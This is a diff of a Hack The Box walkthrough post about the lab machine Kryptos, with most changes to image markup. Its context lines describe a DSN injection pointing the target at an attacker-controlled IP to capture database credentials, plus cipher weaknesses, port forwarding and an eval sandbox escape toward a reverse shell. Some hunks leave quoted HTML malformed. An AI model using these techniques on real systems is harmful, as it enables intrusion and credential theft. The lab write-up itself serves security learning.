@@ -17,10 +17,10 @@ This post documents the complete walkthrough of Kryptos, a retired vulnerable [V
 
 <!--more-->
 
-## On this post 
-{:.no_toc} 
+## On this post
+{:.no_toc}
 
-* TOC 
+* TOC
 {:toc}
 
 ## Background
@@ -66,9 +66,9 @@ PORT   STATE SERVICE REASON         VERSION
 
 Here's how the `http` service looks like.
 
-<a class="image-popup">
-![7994f3a0.png](/assets/images/posts/kryptos-htb-walkthrough/7994f3a0.png)
-</a>
+
+{% include image.html image_alt="7994f3a0.png" image_src="/495619aa-ab62-4bd9-92a7-61d4f7905c78/7994f3a0.png" %}
+
 
 ### Directory/File Enumeration
 
@@ -110,41 +110,41 @@ Looks good. I'll just have to keep these in mind while I explore other parts of 
 
 Let's check out the behavior if we just login with the credential (`admin:admin`).
 
-<a class="image-popup">
-![17c74087.png](/assets/images/posts/kryptos-htb-walkthrough/17c74087.png)
-</a>
+
+{% include image.html image_alt="17c74087.png" image_src="/495619aa-ab62-4bd9-92a7-61d4f7905c78/17c74087.png" %}
+
 
 Nothing fancy. Most likely brute-force isn't the way in. Worse still, the site might have `fail2ban` to prevent brute-forcing. Anyway, this is how the HTML source code looks like.
 
-<a class="image-popup">
-![c626d5c2.png](/assets/images/posts/kryptos-htb-walkthrough/73841380.png)
-</a>
+
+{% include image.html image_alt="c626d5c2.png" image_src="/495619aa-ab62-4bd9-92a7-61d4f7905c78/73841380.png" %}
+
 
 Notice the two hidden fields? `db` is the more interesting of the two; `token` is probably a anti-CSRF token. What happens if we mess with the `db` field?
 
 We can use the browser's element inspector to modify the value of `db`.
 
-<a class="image-popup">
-![bab1f306.png](/assets/images/posts/kryptos-htb-walkthrough/bab1f306.png)
-</a>
+
+{% include image.html image_alt="bab1f306.png" image_src="/495619aa-ab62-4bd9-92a7-61d4f7905c78/bab1f306.png" %}
+
 
 What do we have here?
 
-<a class="image-popup">
-![07c5a6d2.png](/assets/images/posts/kryptos-htb-walkthrough/07c5a6d2.png)
-</a>
+
+{% include image.html image_alt="07c5a6d2.png" image_src="/495619aa-ab62-4bd9-92a7-61d4f7905c78/07c5a6d2.png" %}
+
 
 The error message seems to suggest the use of PHP Data Objects (PDO). Let's change it to `information_schema`, a well-known database in MySQL and MariaDB, and see what happens.
 
-<a class="image-popup">
-![ad2a01cf.png](/assets/images/posts/kryptos-htb-walkthrough/ad2a01cf.png)
-</a>
+
+{% include image.html image_alt="ad2a01cf.png" image_src="/495619aa-ab62-4bd9-92a7-61d4f7905c78/ad2a01cf.png" %}
+
 
 And what do we get?
 
-<a class="image-popup">
-![6c465479.png](/assets/images/posts/kryptos-htb-walkthrough/6c465479.png)
-</a>
+
+{% include image.html image_alt="6c465479.png" image_src="/495619aa-ab62-4bd9-92a7-61d4f7905c78/6c465479.png" %}
+
 
 Hmm. I think I know what's going on here. The login page uses PDO to query a MySQL or MariaDB database server. It doesn't matter what credentials you use, as long as the database returns a valid result, access is granted.
 
@@ -156,9 +156,9 @@ According to the PDO [manual](https://www.php.net/manual/en/book.pdo.php),
 
 To access a database server, you need a database-specific PDO driver. We have more or less determine the database server to be MySQL or MariaDB, what's left is the database source name (DSN).
 
-<a class="image-popup">
-![3a69d0e1.png](/assets/images/posts/kryptos-htb-walkthrough/3a69d0e1.png)
-</a>
+
+{% include image.html image_alt="3a69d0e1.png" image_src="/495619aa-ab62-4bd9-92a7-61d4f7905c78/3a69d0e1.png" %}
+
 
 And since we can control the `dbname` portion of the DSN, we can do something like this.
 
@@ -168,27 +168,27 @@ cryptor;host=10.10.15.127
 
 Where `10.10.15.127` is my IP address and see what goes.
 
-<a class="image-popup">
-![46c3feb6.png](/assets/images/posts/kryptos-htb-walkthrough/46c3feb6.png)
-</a>
+
+{% include image.html image_alt="46c3feb6.png" image_src="/495619aa-ab62-4bd9-92a7-61d4f7905c78/46c3feb6.png" %}
+
 
 Meanwhile, I set up `tcpdump` to check out incoming connections from `10.10.10.129`.
 
-<a class="image-popup">
-![662924a1.png](/assets/images/posts/kryptos-htb-walkthrough/662924a1.png)
-</a>
+
+{% include image.html image_alt="662924a1.png" image_src="/495619aa-ab62-4bd9-92a7-61d4f7905c78/662924a1.png" %}
+
 
 You can see that an incoming connection (SYN) to my IP addresss at `3306/tcp`. As far as I'm aware, the PDO constructor takes in a DSN string, along with the username and password to access database servers. So, if I set up a fake MySQL server, I can probably capture the username and password. Sounds like a plan and Metasploit has an auxiliary module just for that!
 
-<a class="image-popup">
-![7e567248.png](/assets/images/posts/kryptos-htb-walkthrough/7e567248.png)
-</a>
+
+{% include image.html image_alt="7e567248.png" image_src="/495619aa-ab62-4bd9-92a7-61d4f7905c78/7e567248.png" %}
+
 
 The captured `JOHNPWFILE` can be easily fed to JtR for password recovery.
 
-<a class="image-popup">
-![a8e9bc33.png](/assets/images/posts/kryptos-htb-walkthrough/a8e9bc33.png)
-</a>
+
+{% include image.html image_alt="a8e9bc33.png" image_src="/495619aa-ab62-4bd9-92a7-61d4f7905c78/a8e9bc33.png" %}
+
 
 The credential to access the database `cryptor` is (`dbuser:krypt0n1te`). It's a shame we can't capture the SQL queries sent our way. For that, we need to set a real MySQL server and `tail` off the logs.
 
@@ -196,39 +196,39 @@ To do that, I've set up MariaDB server on my attacking machine. We also need to 
 
 _Bind to IP address_
 
-<a class="image-popup">
-![f12d38e1.png](/assets/images/posts/kryptos-htb-walkthrough/f12d38e1.png)
-</a>
+
+{% include image.html image_alt="f12d38e1.png" image_src="/495619aa-ab62-4bd9-92a7-61d4f7905c78/f12d38e1.png" %}
+
 
 _Enable SQL queries logging_
 
-<a class="image-popup">
-![e46a94fc.png](/assets/images/posts/kryptos-htb-walkthrough/e46a94fc.png)
-</a>
+
+{% include image.html image_alt="e46a94fc.png" image_src="/495619aa-ab62-4bd9-92a7-61d4f7905c78/e46a94fc.png" %}
+
 
 With these options set, we can go ahead and start the server. Once that's done, we need to create an empty database `cryptor`, as well as user `dbuser` with password `krypt0n1te`, and grant ALL PERMISSIONS to `cryptor` database like so.
 
-<a class="image-popup">
-![1004b517.png](/assets/images/posts/kryptos-htb-walkthrough/1004b517.png)
-</a>
+
+{% include image.html image_alt="1004b517.png" image_src="/495619aa-ab62-4bd9-92a7-61d4f7905c78/1004b517.png" %}
+
 
 At long last, we can catch a glimpse of the SQL query sent.
 
-<a class="image-popup">
-![9aec2af6.png](/assets/images/posts/kryptos-htb-walkthrough/9aec2af6.png)
-</a>
+
+{% include image.html image_alt="9aec2af6.png" image_src="/495619aa-ab62-4bd9-92a7-61d4f7905c78/9aec2af6.png" %}
+
 
 So, if I create a table `users` with username `admin` and password `21232f297a57a5a743894a0e4a801fc3`, I can return a valid result and thereby, fooling the login page to grant me access.
 
-<a class="image-popup">
-![5e9079e7.png](/assets/images/posts/kryptos-htb-walkthrough/5e9079e7.png)
-</a>
+
+{% include image.html image_alt="5e9079e7.png" image_src="/495619aa-ab62-4bd9-92a7-61d4f7905c78/5e9079e7.png" %}
+
 
 Let's give it a shot.
 
-<a class="image-popup">
-![51210c90.png](/assets/images/posts/kryptos-htb-walkthrough/51210c90.png)
-</a>
+
+{% include image.html image_alt="51210c90.png" image_src="/495619aa-ab62-4bd9-92a7-61d4f7905c78/51210c90.png" %}
+
 
 Sweet.
 
@@ -238,39 +238,39 @@ Long story short, while I was messing with the ciphers, I noticed that the RC4 c
 
 Suppose I create a file with a single character "a" and host the file with Python's SimpleHTTPServer.
 
-<a class="image-popup">
-![849a1f60.png](/assets/images/posts/kryptos-htb-walkthrough/849a1f60.png)
-</a>
+
+{% include image.html image_alt="849a1f60.png" image_src="/495619aa-ab62-4bd9-92a7-61d4f7905c78/849a1f60.png" %}
+
 
 And I encrypt the file with `encrypt.php`.
 
-<a class="image-popup">
-![7ae0fe9f.png](/assets/images/posts/kryptos-htb-walkthrough/7ae0fe9f.png)
-</a>
+
+{% include image.html image_alt="7ae0fe9f.png" image_src="/495619aa-ab62-4bd9-92a7-61d4f7905c78/7ae0fe9f.png" %}
+
 
 This is what I get. Let's decode it back to its hexadecimal representation.
 
-<a class="image-popup">
-![fb459c64.png](/assets/images/posts/kryptos-htb-walkthrough/fb459c64.png)
-</a>
+
+{% include image.html image_alt="fb459c64.png" image_src="/495619aa-ab62-4bd9-92a7-61d4f7905c78/fb459c64.png" %}
+
 
 So, `0x61` gets you `0x39`. The XOR between the two is `0x58`. Extending this observation further, if we create a file of `n` null bytes, we can get the XOR key of `n` bytes.
 
-<a class="image-popup">
-![215a3ce7.png](/assets/images/posts/kryptos-htb-walkthrough/215a3ce7.png)
-</a>
+
+{% include image.html image_alt="215a3ce7.png" image_src="/495619aa-ab62-4bd9-92a7-61d4f7905c78/215a3ce7.png" %}
+
 
 Here's what we get.
 
-<a class="image-popup">
-![7a0c8f59.png](/assets/images/posts/kryptos-htb-walkthrough/7a0c8f59.png)
-</a>
+
+{% include image.html image_alt="7a0c8f59.png" image_src="/495619aa-ab62-4bd9-92a7-61d4f7905c78/7a0c8f59.png" %}
+
 
 Decode the above to retrieve the XOR key.
 
-<a class="image-popup">
-![f667e7ab.png](/assets/images/posts/kryptos-htb-walkthrough/f667e7ab.png)
-</a>
+
+{% include image.html image_alt="f667e7ab.png" image_src="/495619aa-ab62-4bd9-92a7-61d4f7905c78/f667e7ab.png" %}
+
 
 Notice the first byte is `0x58` as it should be. Towards that end, I wrote a simple Python decryptor for the so-called "RC4" scheme.
 
@@ -298,9 +298,9 @@ I also obtained a 512KB XOR key file, conveniently named as `key`, in case the f
 
 Now that we have the decryption out of the way, it's time to figure out how to read files off the machine. I first noticed that I was able to read `/server-status`, which is normally `403 Forbidden`, when I used the local hostname (which I assume to be `kryptos`) in the URL like so:
 
-<a class="image-popup">
-![acbfbb2b.png](/assets/images/posts/kryptos-htb-walkthrough/acbfbb2b.png)
-</a>
+
+{% include image.html image_alt="acbfbb2b.png" image_src="/495619aa-ab62-4bd9-92a7-61d4f7905c78/acbfbb2b.png" %}
+
 
 Another observation was that the URL parameter must begin with `http://`. Well, the encrypted text was decrypted to:
 
@@ -336,7 +336,7 @@ Earlier on, the directory enumeration found one `403 Forbidden`, which was `dev`
 <title>301 Moved Permanently</title>
 </head><body>
 <h1>Moved Permanently</h1>
-<p>The document has moved <a href="http://kryptos/dev/">here</a>.</p>
+<p>The document has moved <a href="http://kryptos/dev/">here.</p>
 <hr>
 <address>Apache/2.4.29 (Ubuntu) Server at kryptos Port 80</address>
 </body></html>
@@ -350,9 +350,9 @@ Surely this is encouraging. Let's pop that trailing `/` in.
     </head>
     <body>
         <div class="menu">
-            <a href="index.php">Main Page</a>
-            <a href="index.php?view=about">About</a>
-            <a href="index.php?view=todo">ToDo</a>
+            <a href="index.php">Main Page
+            <a href="index.php?view=about">About
+            <a href="index.php?view=todo">ToDo
         </div>
 </body>
 </html>
@@ -577,9 +577,9 @@ rm -f $COOKIE
 
 Let's give it a shot.
 
-<a class="image-popup">
-![e268c9c7.png](/assets/images/posts/kryptos-htb-walkthrough/e268c9c7.png)
-</a>
+
+{% include image.html image_alt="e268c9c7.png" image_src="/495619aa-ab62-4bd9-92a7-61d4f7905c78/e268c9c7.png" %}
+
 
 Looks good. Here's the code to `read.sh`.
 
@@ -640,9 +640,9 @@ Let's give a shot to `read.sh`.
 # ./read.sh info.php > info.html
 ```
 
-<a class="image-popup">
-![1ffdb626.png](/assets/images/posts/kryptos-htb-walkthrough/1ffdb626.png)
-</a>
+
+{% include image.html image_alt="1ffdb626.png" image_src="/495619aa-ab62-4bd9-92a7-61d4f7905c78/1ffdb626.png" %}
+
 
 Plenty of disabled functions :angry:
 
@@ -698,9 +698,9 @@ Long story short, I found a file `creds.txt`, which was encrypted by Blowfish (`
 # xxd test.txt
 ```
 
-<a class="image-popup">
-![577cde29.png](/assets/images/posts/kryptos-htb-walkthrough/577cde29.png)
-</a>
+
+{% include image.html image_alt="577cde29.png" image_src="/495619aa-ab62-4bd9-92a7-61d4f7905c78/577cde29.png" %}
+
 
 What this means is that each block of plaintext is XOR'd by the same key, resulting in three identical cipher blocks illustrated above. We can retrieve the key by XOR'ing the first cipher block with the first plaintext block, so on and so forth.
 
@@ -754,15 +754,15 @@ Boom. We have a winner!
 
 Finally...
 
-<a class="image-popup">
-![1be2e8c4.png](/assets/images/posts/kryptos-htb-walkthrough/1be2e8c4.png)
-</a>
+
+{% include image.html image_alt="1be2e8c4.png" image_src="/495619aa-ab62-4bd9-92a7-61d4f7905c78/1be2e8c4.png" %}
+
 
 No surprise. The file `user.txt` is here at the home directory.
 
-<a class="image-popup">
-![0d459211.png](/assets/images/posts/kryptos-htb-walkthrough/0d459211.png)
-</a>
+
+{% include image.html image_alt="0d459211.png" image_src="/495619aa-ab62-4bd9-92a7-61d4f7905c78/0d459211.png" %}
+
 
 ## Privilege Escalation
 
@@ -774,9 +774,9 @@ Let's forward our local port to the remote port with SSH like so.
 # ssh -L 81:127.0.0.1:81 rijndael@10.10.10.129 -f -N
 ```
 
-<a class="image-popup">
-![a38cb190.png](/assets/images/posts/kryptos-htb-walkthrough/a38cb190.png)
-</a>
+
+{% include image.html image_alt="a38cb190.png" image_src="/495619aa-ab62-4bd9-92a7-61d4f7905c78/a38cb190.png" %}
+
 
 Turns out that there's a copy of `kryptos.py` in `rijndael`'s home directory at the `kryptos` directory.
 
@@ -945,9 +945,9 @@ for key in keys:
 
 During my experiment, I found that a sample size of 500 generates enough signing key collisions that will eventually create a valid signature to fool the server to evaluate my expression.
 
-<a class="image-popup">
-![55d50510.png](/assets/images/posts/kryptos-htb-walkthrough/55d50510.png)
-</a>
+
+{% include image.html image_alt="55d50510.png" image_src="/495619aa-ab62-4bd9-92a7-61d4f7905c78/55d50510.png" %}
+
 
 The next hurdle is to bypass `eval(expr, {'__builtins__':None})`. It can be challenging if you are not familiar with Python internals. ***Everything in Python is an object.*** As long as we have access to the object class, we can make use of Python's internal functions and attributes in the current scope to retrieve `__builtins__`, even if it's set to `None`.
 
@@ -957,15 +957,15 @@ The next hurdle is to bypass `eval(expr, {'__builtins__':None})`. It can be chal
 
 Here, I'm using the `warnings` module, to import the `os` module, in order to execute a reverse shell command through `os.system`.
 
-<a class="image-popup">
-![8011f698.png](/assets/images/posts/kryptos-htb-walkthrough/8011f698.png)
-</a>
+
+{% include image.html image_alt="8011f698.png" image_src="/495619aa-ab62-4bd9-92a7-61d4f7905c78/8011f698.png" %}
+
 
 From here on, it's trivial to [upgrade](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) to a fully functioning shell and retrieve `root.txt`.
 
-<a class="image-popup">
-![7d946056.png](/assets/images/posts/kryptos-htb-walkthrough/7d946056.png)
-</a>
+
+{% include image.html image_alt="7d946056.png" image_src="/495619aa-ab62-4bd9-92a7-61d4f7905c78/7d946056.png" %}
+
 
 :dancer:
 
